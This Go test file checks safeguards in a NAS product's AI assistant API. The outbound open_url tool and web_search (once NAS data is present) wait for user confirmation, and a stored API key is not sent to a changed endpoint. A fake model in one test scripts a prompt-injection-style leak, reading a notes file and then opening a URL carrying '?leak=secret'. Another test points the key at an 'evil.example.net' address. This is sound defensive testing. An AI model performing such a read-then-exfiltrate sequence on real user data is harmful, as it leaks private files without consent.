package api

import (
	"context"
	"encoding/json"
	"fmt"
	"io"
	"net/http"
	"net/http/httptest"
	"strings"
	"sync"
	"testing"
	"time"

	"strataos/internal/store"
)

type chatOut struct {
	Reply          string            `json:"reply"`
	ConversationID string            `json:"conversationId"`
	Actions        []assistantAction `json:"actions"`
}

func chatOnce(t *testing.T, tsURL, tok string, body map[string]any) chatOut {
	t.Helper()
	resp, b := assistantDo(t, tsURL, tok, "POST", "/api/assistant/chat", body)
	if resp.StatusCode != 200 {
		t.Fatalf("chat: %d %s", resp.StatusCode, b)
	}
	var out chatOut
	if err := json.Unmarshal(b, &out); err != nil {
		t.Fatal(err)
	}
	return out
}

func userMsg(text string) map[string]any {
	return map[string]any{"messages": []map[string]string{{"role": "user", "content": text}}}
}

// open_url never runs on the model's word: the user confirms the full
// address, then the conversation continues with the page (review 0.12.0:
// prompt injection could make the assistant send NAS data out).
func TestAssistantOpenURLNeedsConfirmation(t *testing.T) {
	fl := &fakeLLM{steps: []fakeStep{
		{tool: "read_file", args: `{"path":"/Data/notes.txt"}`},
		{tool: "open_url", args: `{"url":"http://127.0.0.1:1/?leak=secret"}`},
		{content: "done"},
	}}
	llm := httptest.NewServer(http.HandlerFunc(fl.handler))
	defer llm.Close()
	_, ts, tok := assistantServer(t, llm.URL, true)
	out := chatOnce(t, ts.URL, tok, userMsg("summarize my notes"))
	if len(out.Actions) != 1 || out.Actions[0].Tool != "open_url" || !out.Actions[0].Resume ||
		!strings.Contains(out.Actions[0].Summary, "http://127.0.0.1:1/?leak=secret") {
		t.Fatalf("open_url must wait for the user: %+v", out)
	}
	if fl.calls != 2 {
		t.Fatalf("the model was called %d times before the confirmation", fl.calls)
	}

	// Confirmed: the tool runs (here refused, an internal address) and the
	// model gets its result, then answers; the answer joins the conversation.
	r, _ := http.NewRequest("POST", ts.URL+"/api/assistant/resume", strings.NewReader(`{"token":"`+out.Actions[0].Token+`"}`))
	r.Header.Set("Authorization", "Bearer "+tok)
	r.Header.Set("Content-Type", "application/json")
	resp, err := http.DefaultClient.Do(r)
	if err != nil {
		t.Fatal(err)
	}
	b, _ := io.ReadAll(resp.Body)
	resp.Body.Close()
	if resp.StatusCode != 200 || !strings.Contains(string(b), `"type":"done"`) {
		t.Fatalf("resume: %d %s", resp.StatusCode, b)
	}
	last, _ := json.Marshal(fl.bodies[len(fl.bodies)-1])
	if !strings.Contains(string(last), "open_url failed") || !strings.Contains(string(last), "internal addresses") {
		t.Fatalf("the model did not get the tool result: %.600s", last)
	}
	resp2, body := assistantDo(t, ts.URL, tok, "GET", "/api/assistant/conversations/"+out.ConversationID, nil)
	var chat store.AssistantChat
	if err := json.Unmarshal(body, &chat); err != nil || resp2.StatusCode != 200 {
		t.Fatal(err)
	}
	if n := len(chat.Messages); n == 0 || chat.Messages[n-1].Content != "done" || !chat.NASData {
		t.Fatalf("conversation: %+v", chat)
	}
	// Single use.
	resp3, _ := assistantDo(t, ts.URL, tok, "POST", "/api/assistant/resume", map[string]string{"token": out.Actions[0].Token})
	if resp3.StatusCode != 400 {
		t.Fatalf("resume twice: %d", resp3.StatusCode)
	}
}

// web_search runs freely in a conversation without NAS data, and waits for
// the user once a NAS tool ran (the query could carry the data out).
func TestAssistantWebSearchAfterNASData(t *testing.T) {
	old := webSearchFn
	var queries []string
	var mu sync.Mutex
	webSearchFn = func(_ context.Context, q string) (string, error) {
		mu.Lock()
		queries = append(queries, q)
		mu.Unlock()
		return "1. result", nil
	}
	defer func() { webSearchFn = old }()

	fl := &fakeLLM{steps: []fakeStep{{tool: "web_search", args: `{"query":"debian release"}`}, {content: "ok"}}}
	llm := httptest.NewServer(http.HandlerFunc(fl.handler))
	defer llm.Close()
	_, ts, tok := assistantServer(t, llm.URL, true)
	out := chatOnce(t, ts.URL, tok, userMsg("latest debian?"))
	if len(out.Actions) != 0 || len(queries) != 1 {
		t.Fatalf("clean search must run: %+v %v", out, queries)
	}

	fl2 := &fakeLLM{steps: []fakeStep{{tool: "nas_status", args: `{}`}, {tool: "web_search", args: `{"query":"strata secret"}`}, {content: "ok"}}}
	llm2 := httptest.NewServer(http.HandlerFunc(fl2.handler))
	defer llm2.Close()
	_, ts2, tok2 := assistantServer(t, llm2.URL, true)
	out = chatOnce(t, ts2.URL, tok2, userMsg("status then search"))
	if len(out.Actions) != 1 || out.Actions[0].Tool != "web_search" || len(queries) != 1 {
		t.Fatalf("search after NAS data must wait: %+v %v", out, queries)
	}
	// The flag stays with the saved conversation: the next exchange asks too.
	fl2.mu.Lock()
	fl2.calls, fl2.steps = 0, []fakeStep{{tool: "web_search", args: `{"query":"again"}`}, {content: "ok"}}
	fl2.mu.Unlock()
	out = chatOnce(t, ts2.URL, tok2, map[string]any{"conversationId": out.ConversationID, "messages": []map[string]string{
		{"role": "user", "content": "status then search"}, {"role": "assistant", "content": "x"}, {"role": "user", "content": "search again"}}})
	if len(out.Actions) != 1 || len(queries) != 1 {
		t.Fatalf("follow-up search must wait: %+v %v", out, queries)
	}
}

// The conversations of a user are capped, and so is the size of one
// (review 0.12.0: the cap of 20 was never applied).
func TestAssistantConversationCaps(t *testing.T) {
	fl := &fakeLLM{steps: []fakeStep{{content: strings.Repeat("long answer ", 300)}}}
	llm := httptest.NewServer(http.HandlerFunc(fl.handler))
	defer llm.Close()
	s, ts, tok := assistantServer(t, llm.URL, true)
	for i := 0; i < store.MaxAssistantChats+5; i++ {
		chatOnce(t, ts.URL, tok, userMsg(fmt.Sprintf("question %d", i)))
	}
	var n int
	s.store.Read(func(st *store.State) { n = len(st.AssistantChatsOf("bob")) })
	if n != store.MaxAssistantChats {
		t.Fatalf("%d conversations kept", n)
	}
	// One conversation grows to its byte cap at most.
	first := chatOnce(t, ts.URL, tok, userMsg("start"))
	msgs := []map[string]string{{"role": "user", "content": "start"}}
	for i := 0; i < 30; i++ {
		msgs = append(msgs, map[string]string{"role": "assistant", "content": "a"}, map[string]string{"role": "user", "content": strings.Repeat("q", 3000)})
		chatOnce(t, ts.URL, tok, map[string]any{"conversationId": first.ConversationID, "messages": msgs[max(0, len(msgs)-39):]})
	}
	s.store.Read(func(st *store.State) {
		c := st.AssistantChat("bob", first.ConversationID)
		total := 0
		for _, m := range c.Messages {
			total += len(m.Content)
		}
		if total > store.MaxAssistantBytes {
			t.Fatalf("conversation holds %d bytes", total)
		}
	})
}

// Reading a conversation while another exchange extends it is safe (run
// with -race).
func TestAssistantConversationReadWhileWriting(t *testing.T) {
	fl := &fakeLLM{steps: []fakeStep{{content: "answer"}}}
	llm := httptest.NewServer(http.HandlerFunc(fl.handler))
	defer llm.Close()
	_, ts, tok := assistantServer(t, llm.URL, true)
	out := chatOnce(t, ts.URL, tok, userMsg("hello"))
	var wg sync.WaitGroup
	for i := 0; i < 4; i++ {
		wg.Add(2)
		go func() {
			defer wg.Done()
			assistantDo(t, ts.URL, tok, "POST", "/api/assistant/chat", map[string]any{"conversationId": out.ConversationID,
				"messages": []map[string]string{{"role": "user", "content": "hello"}, {"role": "assistant", "content": "answer"}, {"role": "user", "content": "more"}}})
		}()
		go func() {
			defer wg.Done()
			assistantDo(t, ts.URL, tok, "GET", "/api/assistant/conversations/"+out.ConversationID, nil)
		}()
	}
	wg.Wait()
}

// A key kept masked is never sent to a new assistant address.
func TestAssistantKeyNotSentToNewURL(t *testing.T) {
	s := newTestServer(t)
	s.systemRoutes()
	hash, _ := hashPassword("Secret-Pass-1")
	_ = s.store.Update(func(st *store.State) error {
		st.Users = append(st.Users, &store.User{Username: "admin", Role: "admin", PasswordHash: hash})
		st.Settings.AssistantURL, st.Settings.AssistantKey = "https://api.example.com/v1", "sk-real"
		return nil
	})
	admin := &jarClient{t: t, s: s, host: testHost, jar: map[string]string{cookieName: s.sessions.create("admin", "admin", "192.0.2.9", time.Hour)}}
	w := admin.req("GET", "/api/settings", nil)
	var set map[string]any
	_ = json.Unmarshal(w.Body.Bytes(), &set)
	set["assistantUrl"] = "https://evil.example.net/v1"
	if w = admin.req("PUT", "/api/settings", set); w.Code != 400 {
		t.Fatalf("masked key with a new URL: %d %s", w.Code, w.Body.String())
	}
	set["assistantKey"] = "sk-new"
	if w = admin.req("PUT", "/api/settings", set); w.Code != 200 {
		t.Fatalf("new key: %d %s", w.Code, w.Body.String())
	}
	// Same URL: the masked key keeps the saved one.
	set["assistantKey"] = "********"
	if w = admin.req("PUT", "/api/settings", set); w.Code != 200 {
		t.Fatalf("same URL: %d %s", w.Code, w.Body.String())
	}
	s.store.Read(func(st *store.State) {
		if st.Settings.AssistantKey != "sk-new" {
			t.Fatalf("key = %q", st.Settings.AssistantKey)
		}
	})
}

func TestPullComplete(t *testing.T) {
	if pullComplete("success") != nil || pullComplete("pulling manifest") == nil || pullComplete("") == nil {
		t.Fatal("pullComplete")
	}
}
